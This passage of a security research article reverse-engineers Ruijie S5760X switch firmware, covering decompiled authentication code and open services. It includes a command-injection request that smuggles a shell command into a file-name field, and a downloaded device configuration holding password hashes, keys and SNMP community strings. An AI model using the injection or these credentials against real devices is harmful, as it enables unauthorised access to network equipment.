+        <span class="hljs-keyword">local</span> id = list[<span class="hljs-built_in">table</span>.<span class="hljs-built_in">maxn</span>(list)];
+        <span class="hljs-keyword">local</span> permission_user = permission_id[M.currentUser];
+        <span class="hljs-keyword">if</span> (M.currentUser ~= <span class="hljs-string">&quot;admin&quot;</span> <span class="hljs-keyword">and</span> (permission_onlyAdmin[id] <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> permission_user)) <span class="hljs-keyword">then</span> <span class="hljs-comment">-- No administrator privileges, or no configured page access.</span>
+            <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;
+        <span class="hljs-keyword">end</span>
+        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">not</span> permission_map[id] <span class="hljs-keyword">or</span> permission_user==<span class="hljs-string">&quot;all&quot;</span> <span class="hljs-keyword">or</span>  M.currentUser == <span class="hljs-string">&quot;admin&quot;</span>) <span class="hljs-keyword">then</span>
+            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>
+        <span class="hljs-keyword">end</span>
+        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">type</span>(permission_map[id])==<span class="hljs-string">&quot;string&quot;</span> <span class="hljs-keyword">and</span> permission_user[permission_map[id]]) <span class="hljs-keyword">then</span>
+            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>
+        <span class="hljs-keyword">elseif</span> (<span class="hljs-built_in">type</span>(permission_map[id])==<span class="hljs-string">&quot;table&quot;</span>) <span class="hljs-keyword">then</span>
+            <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> <span class="hljs-built_in">pairs</span>(permission_map[id]) <span class="hljs-keyword">do</span>
+                <span class="hljs-keyword">if</span> permission_user[v] <span class="hljs-keyword">then</span>
+                    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
+                <span class="hljs-keyword">end</span>
+            <span class="hljs-keyword">end</span>
+            <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;
+        <span class="hljs-keyword">else</span>
+            <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;
+        <span class="hljs-keyword">end</span>
+    <span class="hljs-keyword">end</span>
+    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
+<span class="hljs-keyword">end</span>
+</code></pre></div>
+<p>Every handler except <code>unauthenticate.unauthenticate</code> requires login.
+The authentication implementation is in <code>httpd.elf</code>.</p>
+<div class="code-block"><div class="code-toolbar"><span>C</span><span class="copy-status" role="status"></span><button class="copy-button" aria-label="Copy code">Copy ⧉</button></div><pre tabindex="0" aria-label="Code, scroll horizontally"><code class="hljs language-c"><span class="hljs-built_in">memset</span>(decode_value, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(decode_value)); <span class="hljs-comment">// Clear the decoded-string buffer.</span>
+
+v4 = <span class="hljs-built_in">strlen</span>(auth_buf); <span class="hljs-comment">// Get the authentication-string length.</span>
+<span class="hljs-keyword">if</span> ((<span class="hljs-type">int</span>)base64_decode(auth_buf, v4, decode_value, <span class="hljs-number">95LL</span>) &gt;= <span class="hljs-number">0</span>) <span class="hljs-comment">// Base64-decode the authentication data.</span>
+{
+    password = <span class="hljs-built_in">strchr</span>(decode_value, <span class="hljs-string">&#x27;:&#x27;</span>); <span class="hljs-comment">// Find the colon separator.</span>
+    <span class="hljs-keyword">if</span> (password) <span class="hljs-comment">// Separator found.</span>
+    {
+        *password = <span class="hljs-number">0</span>; <span class="hljs-comment">// Replace the separator with a null terminator.</span>
+        
+        <span class="hljs-comment">// Get the current encoding; use UTF-8 if that lookup fails.</span>
+        <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)cli_get_lang_char_set())
+            lang_char_set = cli_get_lang_char_set();
+        <span class="hljs-keyword">else</span>
+            lang_char_set = <span class="hljs-number">3</span>;
+            
+        <span class="hljs-comment">// Convert the decoded username and store it in src.</span>
+        src = (<span class="hljs-type">char</span> *)trancode_strdup(decode_value, <span class="hljs-number">1LL</span>, lang_char_set, &amp;v17);
+        <span class="hljs-keyword">if</span> (src)
+        {
+            <span class="hljs-built_in">memset</span>(decode_value, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(decode_value)); <span class="hljs-comment">// Clear the decoded-string buffer.</span>
+            <span class="hljs-built_in">strncpy</span>(decode_value, src, <span class="hljs-number">0x5Fu</span>LL); <span class="hljs-comment">// Copy the converted username.</span>
+            <span class="hljs-built_in">free</span>(src); <span class="hljs-comment">// Free the temporary allocation.</span>
+            
+            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strlen</span>(decode_value) &lt;= <span class="hljs-number">0x1F</span>) <span class="hljs-comment">// Limit the username to 31 characters.</span>
+            {
+                <span class="hljs-built_in">memset</span>(&amp;v18, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(v18)); <span class="hljs-comment">// Clear the time structure.</span>
+                clock_gettime(<span class="hljs-number">1</span>, &amp;v18); <span class="hljs-comment">// Read the current time.</span>
+                
+                <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(decode_value, <span class="hljs-string">&quot;admin&quot;</span>)) <span class="hljs-comment">// The username is admin.</span>
+                {
+                    pthread_mutex_lock(&amp;stru_455430); <span class="hljs-comment">// Lock access to the global array.</span>
+                    
+                    v25 = <span class="hljs-number">0</span>;
+                    <span class="hljs-keyword">while</span> (v25 &lt;= <span class="hljs-number">2</span>) <span class="hljs-comment">// Iterate over the global-array entries.</span>
+                    {
+                        v21 = *(_QWORD *)&amp;dword_455460[<span class="hljs-number">4</span> * v25 + <span class="hljs-number">6</span>];
+                        
+                        <span class="hljs-keyword">for</span> (s1 = (<span class="hljs-type">char</span> *)(v21 - <span class="hljs-number">272</span>);; s1 = (<span class="hljs-type">char</span> *)(v20 - <span class="hljs-number">272</span>))
+                        {
+                            _X0 = *((_QWORD *)s1 + <span class="hljs-number">34</span>);
+                            __asm { PRFM            #<span class="hljs-number">0</span>, [X0] }
+                            
+                            <span class="hljs-keyword">if</span> (s1 + <span class="hljs-number">272</span> == (<span class="hljs-type">char</span> *)&amp;dword_455460[<span class="hljs-number">4</span> * v25 + <span class="hljs-number">6</span>])
+                            {
+                                ++v25;
+                                <span class="hljs-keyword">break</span>;
+                            }
+                            
+                            <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(s1, decode_value)) <span class="hljs-comment">// Found this user&#x27;s login record.</span>
+                                <span class="hljs-keyword">break</span>;
+                            
+                            v20 = *((_QWORD *)s1 + <span class="hljs-number">34</span>);
+                        }
+                        
+                        <span class="hljs-keyword">if</span> (s1 + <span class="hljs-number">272</span> == (<span class="hljs-type">char</span> *)&amp;dword_455460[<span class="hljs-number">4</span> * v25 + <span class="hljs-number">6</span>])
+                            <span class="hljs-keyword">continue</span>;
+                        
+                        <span class="hljs-keyword">if</span> (!byte_455464 &amp;&amp; v18.tv_sec - *((_QWORD *)s1 + <span class="hljs-number">38</span>) &gt; <span class="hljs-number">599</span>)
+                            *((_DWORD *)s1 + <span class="hljs-number">80</span>) = <span class="hljs-number">0</span>;
+                            
+                        <span class="hljs-keyword">if</span> (*((<span class="hljs-type">int</span> *)s1 + <span class="hljs-number">80</span>) &gt; <span class="hljs-number">4</span>) <span class="hljs-comment">// Check whether consecutive login attempts exceed four.</span>
+                        {
+                            debug_log(<span class="hljs-number">0LL</span>, <span class="hljs-string">&quot;user login limited&quot;</span>);
+                            pthread_mutex_unlock(&amp;stru_455430);
+                            <span class="hljs-keyword">return</span> <span class="hljs-number">11LL</span>;
+                        }
+                        <span class="hljs-keyword">else</span>
+                        {
+                            <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(s1 + <span class="hljs-number">129</span>, auth_buf)) <span class="hljs-comment">// The authentication value matches.</span>
+                            {
+                                *((_DWORD *)s1 + <span class="hljs-number">80</span>) = <span class="hljs-number">0</span>; <span class="hljs-comment">// Reset the login-attempt counter.</span>
+                                clock_gettime(<span class="hljs-number">1</span>, (<span class="hljs-keyword">struct</span> timespec *)s1 + <span class="hljs-number">18</span>); <span class="hljs-comment">// Record the login time.</span>
+                                pthread_mutex_unlock(&amp;stru_455430); <span class="hljs-comment">// Unlock the global array.</span>
+                                
+                                <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>((<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)(a3 + <span class="hljs-number">33</span>), s1))
+                                    printk_syslog_ext(<span class="hljs-number">5LL</span>, <span class="hljs-string">&quot;HTTPD&quot;</span>, <span class="hljs-string">&quot;LOGIN&quot;</span>, <span class="hljs-number">1LL</span>, <span class="hljs-string">&quot;User (%s@%s) login from eweb.&quot;</span>, s1, (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)(a3 + <span class="hljs-number">72</span>));
+                                    
+                                <span class="hljs-built_in">strncpy</span>(a2, s1, <span class="hljs-number">0x1Fu</span>LL); <span class="hljs-comment">// Copy the username to a2.</span>
+                                <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>; <span class="hljs-comment">// Report success.</span>
+                            }
+</code></pre></div>
+<p>The authentication boundary appeared strong, so I paused that route and considered other ports. Port 80 exposed Lua and httpd without another supporting service that offered an obvious entry point.</p>
+<h3>DEBUG</h3>
+<p>A convenient injection point for debugging:</p>
+<div class="code-block"><div class="code-toolbar"><span>CODE</span><span class="copy-status" role="status"></span><button class="copy-button" aria-label="Copy code">Copy ⧉</button></div><pre tabindex="0" aria-label="Code, scroll horizontally"><code>http://192.168.48.73/web/init.lua/ac.system.feature/moveFile
+method: POST
+data: name=&#x27;;ps aux &gt; views/2;
+Retrieving the return value:
+http://192.168.48.73/2
+</code></pre></div>
+<h2 id="section-3">Service reconnaissance</h2>
+<p>Open ports:</p>
+<div class="code-block"><div class="code-toolbar"><span>CODE</span><span class="copy-status" role="status"></span><button class="copy-button" aria-label="Copy code">Copy ⧉</button></div><pre tabindex="0" aria-label="Code, scroll horizontally"><code>Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      5557/httpd.elf
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      4577/rg-sshd
+tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN      4588/rg-telnetd
+tcp        0      0 0.0.0.0:7547            0.0.0.0:*               LISTEN      5525/cwmp_gsoap.elf
+tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      5557/httpd.elf
+tcp        0      0 0.0.0.0:830             0.0.0.0:*               LISTEN      4577/rg-sshd
+tcp        0      0 192.168.48.73:80        192.168.51.22:50589     ESTABLISHED 5557/httpd.elf
+tcp        0      0 192.168.48.73:80        192.168.51.22:53193     SYN_RECV    -
+tcp        0      0 192.168.48.73:80        192.168.51.22:52547     TIME_WAIT   -
+tcp        0      0 :::80                   :::*                    LISTEN      5557/httpd.elf
+tcp        0      0 :::22                   :::*                    LISTEN      4577/rg-sshd
+tcp        0      0 :::23                   :::*                    LISTEN      4588/rg-telnetd
+tcp        0      0 :::443                  :::*                    LISTEN      5557/httpd.elf
+tcp        0      0 :::830                  :::*                    LISTEN      4577/rg-sshd
+udp        0      0 0.0.0.0:67              0.0.0.0:*                           6009/dhcp.elf
+udp        0      0 0.0.0.0:68              0.0.0.0:*                           6123/dhcpc.elf
+udp        0      0 0.0.0.0:123             0.0.0.0:*                           6197/ntp.elf
+udp        0      0 0.0.0.0:41613           0.0.0.0:*                           5694/rg-snmpd
+udp        0      0 0.0.0.0:41106           0.0.0.0:*                           5379/rg_syslogd
+udp        0      0 0.0.0.0:161             0.0.0.0:*                           5694/rg-snmpd
+udp        0      0 0.0.0.0:7547            0.0.0.0:*                           5514/cwmp.elf
+udp        0      0 :::47731                :::*                                5694/rg-snmpd
+udp        0      0 :::123                  :::*                                6197/ntp.elf
+udp        0      0 :::161                  :::*                                5694/rg-snmpd
+raw        0      0 0.0.0.0:1               0.0.0.0:*               1           6009/dhcp.elf
+raw        0      0 0.0.0.0:1               0.0.0.0:*               1           6024/vrrp.elf
+raw        0      0 0.0.0.0:1               0.0.0.0:*               1           5952/webauth
+raw        0      0 0.0.0.0:2               0.0.0.0:*               2           5729/igmp.elf
+raw        0      0 0.0.0.0:112             0.0.0.0:*               112         6024/vrrp.elf
+raw        0      0 ::%4307600:58           :::*                    58          6024/vrrp.elf
+raw        0      0 ::%4307600:58           :::*                    58          5751/mld.elf
+raw        0      0 ::%4307600:58           :::*                    58          4487/tcpip.elf
+raw        0      0 ::%4307600:112          :::*                    112         6024/vrrp.elf
+</code></pre></div>
+<p>Service analysis:
+TCP services:</p>
+<ul>
+<li>80: <code>httpd</code>.</li>
+<li>22, 830: <code>sshd</code>.</li>
+<li>23: <code>telnetd</code>.</li>
+<li>7547: <code>cwmp_gsoap.elf</code>.
+UDP services:</li>
+<li>67, 68: <code>dhcp</code> / <code>dhcpd</code>; deferred until other candidates had been investigated.</li>
+<li>123: <code>ntp</code>.</li>
+<li>161, 41613: <code>rg-snmpd</code>.</li>
+<li>41106: <code>syslogd</code>.
+7547:cwmp.elf
+No controllable process arguments were identified.</li>
+</ul>
+<h2 id="section-4">Investigating the HTTP service</h2>
+<p>download.do:
+<code>http://192.168.48.73/download.do?file=config.text&amp;random=ZC77</code>
+The file-download handler belongs to <code>httpd.elf</code>.
+The files downloadable at this stage were <code>config.text</code> and <code>/web/websys-info.xml</code>.
+Contents of <code>config.text</code>:</p>
+<div class="code-block"><div class="code-toolbar"><span>TEXT</span><span class="copy-status" role="status"></span><button class="copy-button" aria-label="Copy code">Copy ⧉</button></div><pre tabindex="0" aria-label="Code, scroll horizontally"><code class="hljs language-text">version S5760X_RGOS 12.3(1)B0701
+hostname HTJ_ZJ_NB_GXQGJHZZX_3F_S5760
+!
+spanning-tree mst configuration
+ name hanting
+!
+spanning-tree mst 0 priority 4096
+spanning-tree
+!
+ip access-list standard 1
+ 10 deny 192.168.0.0 0.0.255.255 
+ 20 deny 172.30.0.0 0.0.255.255 
+ 30 permit any 
+!
+no ip dhcp snooping vlan 9-10
+ip dhcp snooping
+!
+username admin privilege 15 password 7 0372003d576c507b4044705d4b
+!
+aaa new-model
+!
+aaa authorization exec ACS group tacacs+ local
+aaa authorization exec default local
+aaa authentication login ACS group tacacs+ local
+aaa authentication login default local
+!
+cwmp
+ acs url http://cloud.ruijie.com.cn/service/tr069servlet
+ cpe inform interval 180
+ timer cpe-timeout 90
+!
+service dhcp
+ip dhcp excluded-address 172.30.0.1 172.30.0.100
+!
+ip dhcp pool WiFi-RG_AP
+ option 138 ip 10.76.3.14 
+ network 172.30.0.0 255.255.252.0
+ default-router 172.30.0.1 
+!
+install 0 S5760C-24GT8XS-X
+!
+sysmac c0b8.e653.b8b3
+ip name-server 114.114.114.114
+!
+enable service web-server http
+enable service web-server https
+webmaster level 0 username admin password 7 127657411e5877
+!
+nfpp
+ no arp-guard enable
+ no ip-guard enable
+!
+service password-encryption
+!
+redundancy
+!
+logging buffered 50000
+logging trap warnings
+logging server 10.1.21.21
+clock timezone beijing +8 0
+!
+tacacs-server host 10.1.240.20 key 7 034b22191c3616
+!
+aaa authorization console
+banner login C Please Use ACS Account Login this Device!  
+
+enable secret 5 $1$324j$5pz370x092w32qt1 
+enable service ssh-server
+!
+vlan 2
+ name Wifi-User
+!
+vlan 9
+ name AP_GW-Manage
+!
+vlan 10
+ name Manage
+!
+vlan 20
+ name IPPABX-Robot
+!
+vlan 96
+ name Smart_Speaker
+!
+vlan 100
+ name Internet-Business_qiantai
+!
+vlan 120
+ name Smart_TV
+!
+vlan 200
+ name Smart_RCU
+!
+vlan range 1,800
+!
+interface GigabitEthernet 0/1
+ description To_Gateway
+ switchport mode trunk
+ ip dhcp snooping trust
+!
+interface GigabitEthernet 0/2
+ description To_GA_JK
+!
+interface GigabitEthernet 0/3
+ switchport protected
+ switchport mode trunk
+!
+interface GigabitEthernet 0/4
+ description To_GA_JK_upload
+ switchport access vlan 2
+!
+interface GigabitEthernet 0/5
+ description To_Smart_TV_Server
+ switchport access vlan 120
+!
+interface GigabitEthernet 0/6
+ description To_Smart_TV_Server
+ switchport access vlan 120
+!
+interface GigabitEthernet 0/7
+ description To_Smart_TV_Server
+ switchport access vlan 120
+!
+interface GigabitEthernet 0/8
+ description To_Smart_RCU_Server
+ switchport access vlan 200
+!
+interface GigabitEthernet 0/9
+ description To_Delivery_Robot
+ switchport access vlan 20
+!
+interface GigabitEthernet 0/10
+ description To_IPPABX-HuaxiaoAI_Robot
+ switchport access vlan 20
+!
+interface GigabitEthernet 0/11
+ switchport protected
+ description To_POE_Switch
+ switchport mode trunk
+ ip dhcp snooping trust
+!
+interface GigabitEthernet 0/12
+ switchport protected
+ description To_POE_Switch
+ switchport mode trunk
+ ip dhcp snooping trust
+!
+interface GigabitEthernet 0/13
+ switchport protected
+ description To_POE_Switch
+ switchport mode trunk
+ ip dhcp snooping trust
+!
+interface GigabitEthernet 0/14
+ switchport protected
+ description To_POE_Switch
+ switchport mode trunk
+ ip dhcp snooping trust
+!
+interface GigabitEthernet 0/15
+ switchport protected
+ description To_POE_Switch
+ switchport mode trunk
+ ip dhcp snooping trust
+!
+interface GigabitEthernet 0/16
+ switchport protected
+ description To_POE_Switch
+ switchport mode trunk
+ ip dhcp snooping trust
+!
+interface GigabitEthernet 0/17
+ switchport protected
+ description To_POE_Switch
+ switchport mode trunk
+ ip dhcp snooping trust
+!
+interface GigabitEthernet 0/18
+ switchport protected
+ description To_POE_Switch
+ switchport mode trunk
+ ip dhcp snooping trust
+!
+interface GigabitEthernet 0/19
+ switchport protected
+ description To_POE_Switch
+ switchport mode trunk
+ ip dhcp snooping trust
+!
+interface GigabitEthernet 0/20
+ switchport protected
+ description To_POE_Switch
+ switchport mode trunk
+ ip dhcp snooping trust
+!
+interface GigabitEthernet 0/21
+ description To_VPN
+ switchport mode trunk
+!
+interface GigabitEthernet 0/22
+ description To_VPN
+ switchport mode trunk
+!
+interface GigabitEthernet 0/23
+ description To_AC
+ switchport mode trunk
+ ip dhcp snooping trust
+!
+interface GigabitEthernet 0/24
+ description To_PMS_Switch
+ switchport mode trunk
+!
+interface TenGigabitEthernet 0/25
+!
+interface TenGigabitEthernet 0/26
+!
+interface TenGigabitEthernet 0/27
+!
+interface TenGigabitEthernet 0/28
+!
+interface TenGigabitEthernet 0/29
+!
+interface TenGigabitEthernet 0/30
+!
+interface TenGigabitEthernet 0/31
+!
+interface TenGigabitEthernet 0/32
+!
+interface VLAN 1
+ ip address mix dhcp
+ ip address mix 192.168.1.200 255.255.255.0
+!
+interface VLAN 9
+ description AP-GW-Manage
+ ip address 172.30.0.1 255.255.252.0
+!
+interface VLAN 10
+ ip address 10.76.3.125 255.255.255.128
+!
+interface VLAN 800
+ description IPPBX-Gateway
+ ip address 10.76.3.250 255.255.255.128
+!
+interface Mgmt 0
+ ip address mix dhcp
+ ip address mix 192.168.1.200 255.255.255.0
+!
+ntp server 10.76.3.126
+ntp server 10.1.240.10
+!
+monitor session 1 destination interface GigabitEthernet 0/2 switch
+monitor session 1 source interface GigabitEthernet 0/1 both
+!
+ip route 0.0.0.0 0.0.0.0 10.76.3.126
+ip route 10.0.0.0 255.0.0.0 10.76.3.1
+!
+snmp-server host 10.1.21.21 traps HuAzHu@SnMpRw
+snmp-server community 7 120f10335025343218222855333e rw 
+snmp-server community 7 0062216d571e16211e0b1a14282f300065 ro 
+!
+line console 0
+ authorization exec ACS
+ login authentication ACS
+line vty 0 4
+ access-class 1 in
+ exec-timeout 15 0
+ authorization exec ACS
+ login authentication ACS
+!
+end
+</code></pre></div>
+<p>Relevant information:</p>
+<div class="code-block"><div class="code-toolbar"><span>CODE</span><span class="copy-status" role="status"></span><button class="copy-button" aria-label="Copy code">Copy ⧉</button></div><pre tabindex="0" aria-label="Code, scroll horizontally"><code>Front-desk VLAN: 100.
+vlan 100
+ name Internet-Business_qiantai
+enable secret 5 $1$324j$5pz370x092w32qt1  // Researcher-configured value: QWE12345678.
+enable service ssh-server
+</code></pre></div><div class="article-tags"><a class="tag" href="/search/?q=Ruijie">#<!-- -->Ruijie</a><a class="tag" href="/search/?q=S5760X">#<!-- -->S5760X</a><a class="tag" href="/search/?q=RGOS">#<!-- -->RGOS</a><a class="tag" href="/search/?q=firmware">#<!-- -->firmware</a><a class="tag" href="/search/?q=Lua">#<!-- -->Lua</a><a class="tag" href="/search/?q=authentication">#<!-- -->authentication</a></div><nav class="reading-nav" aria-label="Article navigation"><a href="/articles/">← <!-- -->Back to archive</a><a href="/notes/">Continue with Notes ↗</a></nav></article><aside class="toc-wrap"><nav class="toc" aria-label="Table of contents"><p class="toc-label">On this page</p><a class="active" aria-current="location" href="#section-1">Firmware extraction</a><a href="#section-2">Vulnerability research</a><a href="#section-3">Service reconnaissance</a><a href="#section-4">Investigating the HTTP service</a></nav><div class="toc-meta">Firmware Reversing<br/>12 min read<br/><a href="/articles/">All articles ↗</a></div></aside></div><section class="related-reading"><div class="section-heading"><h2>Continue reading</h2></div><div class="related-grid"><a href="/articles/centurylink-openwrt-research/"><span class="meta">Firmware Reversing</span><h3>Inside the CenturyLink firmware.</h3><span class="meta">12 min read<!-- --> ↗</span></a><a href="/articles/dlink-dsr-250n-research/"><span class="meta">Vulnerability Research</span><h3>Following the DSR-250N request path.</h3><span class="meta">8 min read<!-- --> ↗</span></a></div></section><!--$--><!--/$--></main><footer class="site-footer wrap"><a class="footer-brand" href="/">S/R<span>Security Research</span></a><p class="footer-motto">Independent research. Carefully documented.</p><span>© <!-- -->2026</span></footer><script src="/_next/static/chunks/0tqtjom54jba3.js" id="_R_" async=""></script><script>(self.__next_f=self.__next_f||[]).push([0])</script><script>self.__next_f.push([1,"1:\"$Sreact.fragment\"\n2:I[48303,[\"/_next/static/chunks/0a6vvedg20z8_.js\",\"/_next/static/chunks/0d3shmwh5_nmn.js\"],\"SiteHeader\"]\n3:I[39756,[\"/_next/static/chunks/0a6vvedg20z8_.js\",\"/_next/static/chunks/0d3shmwh5_nmn.js\"],\"default\"]\n4:I[37457,[\"/_next/static/chunks/0a6vvedg20z8_.js\",\"/_next/static/chunks/0d3shmwh5_nmn.js\"],\"default\"]\n5:I[22016,[\"/_next/static/chunks/0a6vvedg20z8_.js\",\"/_next/static/chunks/0d3shmwh5_nmn.js\",\"/_next/static/chunks/0gm4~9_sxn0dp.js\"],\"\"]\n7:I[97367,[\"/_next/static/chunks/0a6vvedg20z8_.js\",\"/_next/static/chunks/0d3shmwh5_nmn.js\"],\"OutletBoundary\"]\n8:\"$Sreact.suspense\"\nb:I[97367,[\"/_next/static/chunks/0a6vvedg20z8_.js\",\"/_next/static/chunks/0d3shmwh5_nmn.js\"],\"ViewportBoundary\"]\nd:I[97367,[\"/_next/static/chunks/0a6vvedg20z8_.js\",\"/_next/static/chunks/0d3shmwh5_nmn.js\"],\"MetadataBoundary\"]\nf:I[68027,[\"/_next/static/chunks/0a6vvedg20z8_.js\",\"/_next/static/chunks/0d3shmwh5_nmn.js\"],\"default\",1]\n:HL[\"/_next/static/chunks/04mzt9x86awfs.css\",\"style\"]\n"])</script><script>self.__next_f.push([1,"0:{\"P\":null,\"c\":[\"\",\"articles\",\"ruijie-s5760x-research\",\"\"],\"q\":\"\",\"i\":false,\"f\":[[[\"\",{\"children\":[\"articles\",{\"children\":[[\"slug\",\"ruijie-s5760x-research\",\"d\",null],{\"children\":[\"__PAGE__\",{}]}]}]},\"$undefined\",\"$undefined\",16],[[\"$\",\"$1\",\"c\",{\"children\":[[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/chunks/04mzt9x86awfs.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\",\"nonce\":\"$undefined\"}],[\"$\",\"script\",\"script-0\",{\"src\":\"/_next/static/chunks/0a6vvedg20z8_.js\",\"async\":true,\"nonce\":\"$undefined\"}],[\"$\",\"script\",\"script-1\",{\"src\":\"/_next/static/chunks/0d3shmwh5_nmn.js\",\"async\":true,\"nonce\":\"$undefined\"}]],[\"$\",\"html\",null,{\"lang\":\"en\",\"data-scroll-behavior\":\"smooth\",\"children\":[\"$\",\"body\",null,{\"children\":[[\"$\",\"$L2\",null,{}],[\"$\",\"main\",null,{\"id\":\"main\",\"className\":\"wrap\",\"tabIndex\":-1,\"children\":[\"$\",\"$L3\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L4\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":[[\"$\",\"section\",null,{\"className\":\"empty\",\"children\":[[\"$\",\"span\",null,{\"className\":\"eyebrow\",\"children\":\"404 / Page not found\"}],[\"$\",\"h1\",null,{\"className\":\"not-found-title\",\"children\":\"This page is out of frame.\"}],[\"$\",\"p\",null,{\"children\":\"This link may have changed. Return to the archive to keep reading.\"}],[\"$\",\"$L5\",null,{\"className\":\"text-link\",\"href\":\"/articles\",\"children\":\"Back to archive ↗\"}]]}],[]],\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]}],[\"$\",\"footer\",null,{\"className\":\"site-footer wrap\",\"children\":[[\"$\",\"$L5\",null,{\"className\":\"footer-brand\",\"href\":\"/\",\"children\":[\"S/R\",[\"$\",\"span\",null,{\"children\":\"Security Research\"}]]}],[\"$\",\"p\",null,{\"className\":\"footer-motto\",\"children\":\"Independent research. Carefully documented.\"}],[\"$\",\"span\",null,{\"children\":[\"© \",\"2026\"]}]]}]]}]}]]}],{\"children\":[[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"$L3\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L4\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]]}],{\"children\":[[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"$L3\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L4\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]]}],{\"children\":[[\"$\",\"$1\",\"c\",{\"children\":[\"$L6\",[[\"$\",\"script\",\"script-0\",{\"src\":\"/_next/static/chunks/0gm4~9_sxn0dp.js\",\"async\":true,\"nonce\":\"$undefined\"}]],[\"$\",\"$L7\",null,{\"children\":[\"$\",\"$8\",null,{\"name\":\"Next.MetadataOutlet\",\"children\":\"$@9\"}]}]]}],{},null,false,null]},null,false,\"$@a\"]},null,false,\"$@a\"]},null,false,null],[\"$\",\"$1\",\"h\",{\"children\":[null,[\"$\",\"$Lb\",null,{\"children\":\"$Lc\"}],[\"$\",\"div\",null,{\"hidden\":true,\"children\":[\"$\",\"$Ld\",null,{\"children\":[\"$\",\"$8\",null,{\"name\":\"Next.Metadata\",\"children\":\"$Le\"}]}]}],null]}],false]],\"m\":\"$undefined\",\"G\":[\"$f\",[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/chunks/04mzt9x86awfs.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\",\"nonce\":\"$undefined\"}]]],\"S\":true,\"h\":null,\"s\":\"$undefined\",\"l\":\"$undefined\",\"p\":\"$undefined\",\"d\":\"$undefined\",\"b\":\"P8xy_F8wWr3g-2Pr08D9C\"}\n"])</script><script>self.__next_f.push([1,"10:[]\na:\"$W10\"\n"])</script><script>self.__next_f.push([1,"11:I[1817,[\"/_next/static/chunks/0a6vvedg20z8_.js\",\"/_next/static/chunks/0d3shmwh5_nmn.js\",\"/_next/static/chunks/0gm4~9_sxn0dp.js\"],\"ArticleToc\"]\n12:I[32947,[\"/_next/static/chunks/0a6vvedg20z8_.js\",\"/_next/static/chunks/0d3shmwh5_nmn.js\",\"/_next/static/chunks/0gm4~9_sxn0dp.js\"],\"CodeBlock\"]\n13:T5a7,"])</script><script>self.__next_f.push([1,"main-1.0.0.562ec491-1\nT44817e735a877cae967354a9a8a60c974c15c706\nmain\n1.0.0.562ec491\nmain upgrade package\n[kernel]\nname=kernel.img\nver=4.9.190.43b2daf311bf3f\n[rootfs]\nname=rootfs.sqsh\nver=1.0.0.b1028d65\nsup_list=0xc080;0xc081;0xc082;0xc0b7;0xc0b8;0xc0c5;\nserial_list=137;104\n[softver]\nver=RGOS 